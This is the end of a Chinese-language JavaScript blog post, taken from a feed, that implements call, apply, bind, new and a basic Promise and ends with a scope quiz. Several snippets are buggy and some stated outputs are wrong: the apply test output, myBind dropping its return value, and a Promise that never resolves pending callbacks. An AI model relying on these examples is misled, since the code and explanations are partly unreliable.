class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123;</span><br><span class="line">    name: &apos;fu&apos;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test() &#123;</span><br><span class="line">    console.log(this.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test() // undefined</span><br><span class="line">test.call(o) // &apos;fu&apos;</span><br><span class="line">test.myCall(o) // &apos;fu&apos;</span><br></pre></td></tr></table></figure></li></ul><h2 id="实现-Function-prototype-apply"><a href="#实现-Function-prototype-apply" class="headerlink" title="实现 Function.prototype.apply"></a>实现 Function.prototype.apply</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.myApply = function(obj, args) &#123;</span><br><span class="line">    if (typeof this !== &apos;function&apos;) throw new Error(&apos;type error&apos;)</span><br><span class="line"></span><br><span class="line">    // 默认值 window</span><br><span class="line">    obj = obj || window</span><br><span class="line"></span><br><span class="line">    // 防止覆盖 obj 已有 fn 属性</span><br><span class="line">    const _fn = Symbol(&apos;fn&apos;)</span><br><span class="line"></span><br><span class="line">    // call 位于函数实例的原型上，因此调用时 call 函数内的 this 指向函数实例自身</span><br><span class="line">    obj[_fn] = this</span><br><span class="line"></span><br><span class="line">    const _result = obj[_fn](...args)</span><br><span class="line">    delete obj[_fn]</span><br><span class="line">    </span><br><span class="line">    return _result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>测试一下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123;</span><br><span class="line">    name: &apos;fu&apos;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test(...args) &#123;</span><br><span class="line">    console.log(this.name, ...args)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var arr = [1,2,3]</span><br><span class="line"></span><br><span class="line">test(arr) // [1,2,3]</span><br><span class="line">test.apply(o) // &apos;fu&apos; 1,2,3</span><br><span class="line">test.myApply(o) // &apos;fu&apos; 1,2,3</span><br></pre></td></tr></table></figure></li></ul><h2 id="实现-Function-prototype-bind"><a href="#实现-Function-prototype-bind" class="headerlink" title="实现 Function.prototype.bind"></a>实现 Function.prototype.bind</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.myBind = function (thisArg, ...args) &#123;</span><br><span class="line">    if (typeof this !== &quot;function&quot;) &#123;</span><br><span class="line">      throw Error(&quot;type error&quot;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var self = this</span><br><span class="line">    var fn = function () &#123;</span><br><span class="line">        self.apply(this instanceof self ? this : thisArg, args.concat(Array.prototype.slice.call(arguments)))</span><br><span class="line">    &#125;</span><br><span class="line">    // 继承原型上的属性和方法</span><br><span class="line">    fn.prototype = Object.create(self.prototype);</span><br><span class="line"></span><br><span class="line">    return fn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>测试一下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123;</span><br><span class="line">    name: &apos;fu&apos;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test(...args) &#123;</span><br><span class="line">    console.log(this.name, args)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var t = test.myBind(o, 1,2,3)</span><br><span class="line"></span><br><span class="line">t() // fu [1,2,3]</span><br><span class="line">t(4) // fu [1,2,3,4]</span><br></pre></td></tr></table></figure></li></ul><h2 id="new-操作符"><a href="#new-操作符" class="headerlink" title="new 操作符"></a>new 操作符</h2><ul><li>new 操作符都做了什么？</li></ul><ol><li>在内存中创建一个新对象</li><li>这个新对象内部的[[Prototype]]特性被赋值为构造函数的 prototype 属性</li><li>构造函数内部的 this 被赋值为这个新对象（即this指向新对象）</li><li>执行构造函数内部的代码（给新对象添加属性）</li><li>如果构造函数返回非空对象，则返回该对象；否则，返回刚创建的新对象。</li></ol><ul><li>实现一个 new<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * </span><br><span class="line"> * @param &#123;*&#125; constructor 第一个参数为</span><br><span class="line"> */</span><br><span class="line">var newFactory = function() &#123;</span><br><span class="line">  var obj = &#123;&#125;;</span><br><span class="line">  var Con = [].shift.apply(arguments);</span><br><span class="line">  obj.__proto__ = Con.prototype;</span><br><span class="line">  var ret = Con.apply(obj, arguments);</span><br><span class="line">  return typeof ret === &quot;object&quot; ? ret : obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// test</span><br><span class="line">function A(name) &#123;</span><br><span class="line">  this.name = name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(newFactory(A, &apos;fffff&apos;)) // A &#123;name: &quot;fffff&quot;&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="promise"><a href="#promise" class="headerlink" title="promise"></a>promise</h2><ul><li>实现一个 promise<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">function myPromise(callback) &#123;</span><br><span class="line">  const self = this;</span><br><span class="line">  self.status = &quot;pending&quot;; // pending、resolved、rejected</span><br><span class="line">  self.value = undefined;</span><br><span class="line">  self.reason = undefined;</span><br><span class="line"></span><br><span class="line">  function resolve(value) &#123;</span><br><span class="line">    if (self.status === &quot;pending&quot;) &#123;</span><br><span class="line">      self.value = value;</span><br><span class="line">      self.status = &apos;resolved&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function reject(reason) &#123;</span><br><span class="line">    if (self.status === &quot;pending&quot;) &#123;</span><br><span class="line">      self.reason = reason;</span><br><span class="line">      self.status = &apos;rejected&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  try &#123;</span><br><span class="line">    callback(resolve, reject)</span><br><span class="line">  &#125; catch(e) &#123;</span><br><span class="line">    reject(e)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myPromise.prototype.then = function(onResolved, onRejected) &#123;</span><br><span class="line">  const self = this;</span><br><span class="line">  switch(self.status)&#123;</span><br><span class="line">    case &quot;resolved&quot;:</span><br><span class="line">      onResolved(self.value);</span><br><span class="line">      break;</span><br><span class="line">    case &quot;rejected&quot;:</span><br><span class="line">      onRejected(self.reason);</span><br><span class="line">      break;</span><br><span class="line">    default:       </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 测试一下</span><br><span class="line">var p = new myPromise((r, j) =&gt; &#123;</span><br><span class="line">  setTimeout(() =&gt; &#123;</span><br><span class="line">      r(66666)</span><br><span class="line">  &#125;, 3000)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p.then((v) =&gt; &#123;</span><br><span class="line">  console.log(v) // 6666</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h2 id="函数的this"><a href="#函数的this" class="headerlink" title="函数的this"></a>函数的this</h2><ol><li>问一下两段代码各输出什么？<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var value = 1;</span><br><span class="line"></span><br><span class="line">function foo() &#123;</span><br><span class="line">    console.log(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function bar() &#123;</span><br><span class="line">    var value = 2;</span><br><span class="line">    foo(); // 这里相当于window.foo()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line"></span><br><span class="line">// 1</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var value = 1;</span><br><span class="line"></span><br><span class="line">function bar() &#123;</span><br><span class="line">    var value = 2;</span><br><span class="line"></span><br><span class="line">    function foo() &#123;</span><br><span class="line">        console.log(value);</span><br><span class="line">    &#125;</span><br><span class="line">    foo(); // 这里在bar函数作用域内</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line"></span><br><span class="line">// 2</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;null-和-0-比较&quot;&gt;&lt;a href=&quot;#null-和-0-比较&quot; class=&quot;headerlink&quot; title=&quot;null 和 0 比较&quot;&gt;&lt;/a&gt;null 和 0 比较&lt;/h2&gt;&lt;p&gt;&lt;em&gt;最近在项目中修改 bug 时发现的一个不太理解的问题：&lt;/e
      
    
    </summary>
    
      <category term="JavaScript" scheme="https://fuzhongfeng.github.io/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="https://fuzhongfeng.github.io/tags/JavaScript/"/>
    
  </entry>
  
</feed>
